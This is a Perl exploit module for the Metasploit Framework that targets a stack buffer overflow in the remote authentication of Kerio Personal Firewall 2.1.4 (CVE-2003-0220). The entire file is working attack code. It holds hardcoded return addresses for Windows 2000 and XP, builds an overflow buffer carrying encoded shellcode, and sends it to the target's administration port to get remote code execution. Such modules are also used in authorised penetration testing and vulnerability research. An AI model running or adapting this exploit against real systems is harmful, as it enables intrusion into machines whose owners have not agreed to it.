##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::kerio_auth;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {

	'Name'  => 'Kerio Personal Firewall 2 (2.1.4) Remote Authentication Packet Buffer Overflow',
	'Version'  => '$Revision: 1.1 $',
	'Authors' => [ 'y0 [at] w00t-shell.net', ],
	'Arch'  => [ 'x86' ],
	'OS'    => [ 'win32', 'win2000', 'winxp', ],
	'Priv'  => 0,
	'UserOpts'  => {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 44334],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },
	'AutoOpts' => { 'EXITFUNC' => 'process' },
	'Payload' => {
		'Space'     => 1000,
		'BadChars'  => "\x00",
		'Prepend'   => "\x81\xc4\x54\xf2\xff\xff",
		'Keys'      => ['-ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
	This module exploits a stack overflow in Kerio Personal Firewall 
administration authentication process. This module has only been tested 
against Kerio Personal Firewall 2 2.1.4.
}),

	'Refs'  =>  [
		['BID', '7180'],
		['CVE', '2003-0220'],
		['URL', 'http://www1.corest.com/common/showdoc.php?idx=314&idxseccion=10'],
	  ],

	'Targets' => [
		['Windows 2000 Pro SP4 English', 0x7c2ec68b],
		['Windows XP Pro SP0 English',   0x77e3171b],
		['Windows XP Pro SP1 English',   0x77dc5527],
	  ],

	'Keys' => ['firewall'],

	'DisclosureDate' => 'Apr 28 2003',

  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit
{
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	if (! $self->InitNops(128)) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	my $sploit =
	  Pex::Text::AlphaNumText(4268). $shellcode.
	  pack('V', $target->[1]). "\xe9\x0b\xfe\xff\xff";

	$self->PrintLine(sprintf("[*] Trying to exploit target %s 0x%.8x", $target->[0], $target->[1]));

	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
		'LocalPort' => $self->GetVar('CPORT'),
		'SSL'       => $self->GetVar('SSL'),
	  );
	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	$s->Send($sploit);
	$self->Handler($s);
	$s->Close();
	return;
}

1;
